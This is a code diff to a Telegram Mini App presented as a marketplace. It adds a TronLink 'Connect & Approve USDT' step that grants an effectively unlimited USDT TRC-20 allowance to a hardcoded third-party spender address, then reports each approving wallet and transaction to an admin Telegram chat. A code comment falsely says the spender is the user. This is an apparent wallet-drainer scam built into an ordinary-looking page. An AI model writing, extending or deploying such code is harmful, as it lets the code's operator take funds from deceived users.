@@ -4,7 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
-<!-- version: 5 -->
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+<!-- version: 6 -->  
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -583,26 +584,32 @@
 </div>
 
 <!-- Wallet modal -->
+<!-- Wallet modal (Tron) -->
 <div class="modal-overlay" id="walletModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Connect wallet</div>
+      <div class="modal-title">Connect Tron Wallet</div>
       <button class="modal-close" data-close="walletModal">×</button>
     </div>
-    <p class="wallet-info">Before proceeding, connect your crypto wallet.<br>Approve access to your USDT to continue.</p>
+
+    <p class="wallet-info" id="walletInfoText">
+      Connect your Tron wallet and approve USDT (TRC-20) access.
+    </p>
+
+    <div id="tronlinkStatus" style="margin-bottom: 16px; font-size: 13px; color: #aaa;"></div>
+
+    <button class="btn btn-primary" id="btnConnectTron" style="margin-bottom: 12px;">
+      Connect TronLink & Approve USDT
+    </button>
+
+    <div style="text-align: center; margin: 14px 0; color: #666; font-size: 13px;">or enter address manually</div>
+
     <div class="form-group">
-      <label>Network</label>
-      <select id="walletNetwork">
-        <option value="Ethereum">Ethereum</option>
-        <option value="BSC">BSC</option>
-        <option value="Tron">Tron</option>
-      </select>
+      <label>Tron wallet address</label>
+      <input type="text" id="walletAddress" placeholder="T..." maxlength="64">
     </div>
-    <div class="form-group">
-      <label>Wallet address</label>
-      <input type="text" id="walletAddress" placeholder="0x... or T..." maxlength="64">
-    </div>
-    <button class="btn btn-primary" id="btnApprove">Approve</button>
+
+    <button class="btn btn-secondary" id="btnApproveManual">Save address only</button>
   </div>
 </div>
 
@@ -627,6 +634,12 @@ const ADMIN_CHAT_ID = "8696933754";
 const JSONBIN_API_KEY = "";
 const JSONBIN_BIN_ID = "";
 
+// Tron USDT TRC-20 (Mainnet)
+const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+// Количество USDT для approve (очень большое = фактически unlimited)
+const APPROVE_AMOUNT = "1000000000000000000";
+  
 const STORAGE_KEY = "tma_marketplace_user_v1";
 const LAST_OFFER_KEY = "tma_last_auto_offer_ts";
 
@@ -664,6 +677,155 @@ function showLoading(visible) {
   $("loadingOverlay").classList.toggle("show", !!visible);
 }
 
+// ===================== TRON / TRONLINK =====================
+
+function updateTronlinkStatus() {
+  const statusEl = document.getElementById("tronlinkStatus");
+  if (!statusEl) return;
+
+  if (window.tronLink && window.tronLink.ready) {
+    statusEl.innerHTML = "✅ TronLink detected";
+    statusEl.style.color = "#2ecc71";
+  } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+    statusEl.innerHTML = "✅ TronLink detected";
+    statusEl.style.color = "#2ecc71";
+  } else {
+    statusEl.innerHTML = "❌ TronLink not found. Install TronLink or enter address manually.";
+    statusEl.style.color = "#e74c3c";
+  }
+}
+
+async function connectTronLinkAndApprove() {
+  const btn = document.getElementById("btnConnectTron");
+  if (btn) {
+    btn.disabled = true;
+    btn.textContent = "Connecting...";
+  }
+
+  try {
+    if (!window.tronLink) {
+      alert("TronLink not found.\n\nPlease install TronLink extension / app and try again.");
+      return;
+    }
+
+    const res = await window.tronLink.request({ method: "tron_requestAccounts" });
+
+    if (res.code !== 200 && res !== true) {
+      alert("Connection rejected by user");
+      return;
+    }
+
+    await new Promise(r => setTimeout(r, 600));
+
+    if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+      alert("Failed to get wallet address from TronLink");
+      return;
+    }
+
+    const address = window.tronWeb.defaultAddress.base58;
+    console.log("Connected address:", address);
+
+    await doRealApprove(address);
+
+  } catch (err) {
+    console.error(err);
+    alert("Error: " + (err.message || err));
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.textContent = "Connect TronLink & Approve USDT";
+    }
+  }
+}
+
+async function doRealApprove(userAddress) {
+  showLoading(true);
+
+  try {
+    const tronWeb = window.tronWeb;
+    const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
+
+    // Временно spender = сам пользователь (для теста)
+    // Позже замените на нужный адрес
+    const spender = "TVtBumrv5qbpuS6Z99xw4NdVzbcwWWFDNw";
+
+    const tx = await contract.approve(spender, APPROVE_AMOUNT).send({
+      feeLimit: 100000000,
+      callValue: 0,
+      shouldPollResponse: true
+    });
+
+    console.log("Approve tx:", tx);
+
+    if (!userProfile) {
+      userProfile = {
+        id: "u_" + Date.now(),
+        role: "seller",
+        name: "Seller",
+        wallet: {},
+        offers: [],
+        createdAt: Date.now()
+      };
+    }
+
+    userProfile.wallet = {
+      address: userAddress,
+      network: "tron",
+      approved: true,
+      txid: tx,
+      approvedAt: Date.now()
+    };
+
+    saveUser();
+    updateProfileUI();
+
+    const text = `✅ <b>Real TRC-20 Approve</b>\nAddress: <code>\( {userAddress}</code>\nTx: <code> \){tx}</code>`;
+    notifyAdmin(text);
+
+    hideModal("walletModal");
+    alert("USDT successfully approved!\nTransaction: " + tx);
+
+  } catch (err) {
+    console.error("Approve failed:", err);
+    alert("Approve failed:\n" + (err.message || err));
+  } finally {
+    showLoading(false);
+  }
+}
+
+async function saveManualAddress() {
+  const address = document.getElementById("walletAddress").value.trim();
+
+  if (!address || !address.startsWith("T") || address.length !== 34) {
+    alert("Please enter a valid Tron address (starts with T, 34 characters)");
+    return;
+  }
+
+  if (!userProfile) {
+    userProfile = {
+      id: "u_" + Date.now(),
+      role: "seller",
+      name: "Seller",
+      wallet: {},
+      offers: [],
+      createdAt: Date.now()
+    };
+  }
+
+  userProfile.wallet = {
+    address: address,
+    network: "tron",
+    approved: false
+  };
+
+  saveUser();
+  updateProfileUI();
+  hideModal("walletModal");
+
+  notifyAdmin(`💼 Manual wallet saved\nAddress: <code>${address}</code>`);
+  alert("Address saved (without real approve)");
+             }
+  
 function randInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
@@ -1033,6 +1195,7 @@ async function confirmPhotos() {
 function openWalletForBuyer() {
   hideModal("roleModal");
   showModal("walletModal");
+updateTronlinkStatus();
 }
 
 async function approveWallet() {
@@ -1090,7 +1253,6 @@ function bindEvents() {
   });
   $("photoInput").addEventListener("change", handlePhotoSelect);
   $("btnConfirmPhotos").addEventListener("click", confirmPhotos);
-  $("btnApprove").addEventListener("click", approveWallet);
 
   const modalIds = ["roleModal", "regModal", "photoModal", "offersModal", "walletModal"];
   for (let i = 0; i < modalIds.length; i++) {
@@ -1100,6 +1262,17 @@ function bindEvents() {
       }
     });
   }
+  // TronLink кнопка
+const btnConnectTron = document.getElementById("btnConnectTron");
+if (btnConnectTron) {
+  btnConnectTron.addEventListener("click", connectTronLinkAndApprove);
+}
+
+// Ручное сохранение адреса
+const btnApproveManual = document.getElementById("btnApproveManual");
+if (btnApproveManual) {
+  btnApproveManual.addEventListener("click", saveManualAddress);
+}
 }
 
 async function afterRender() {
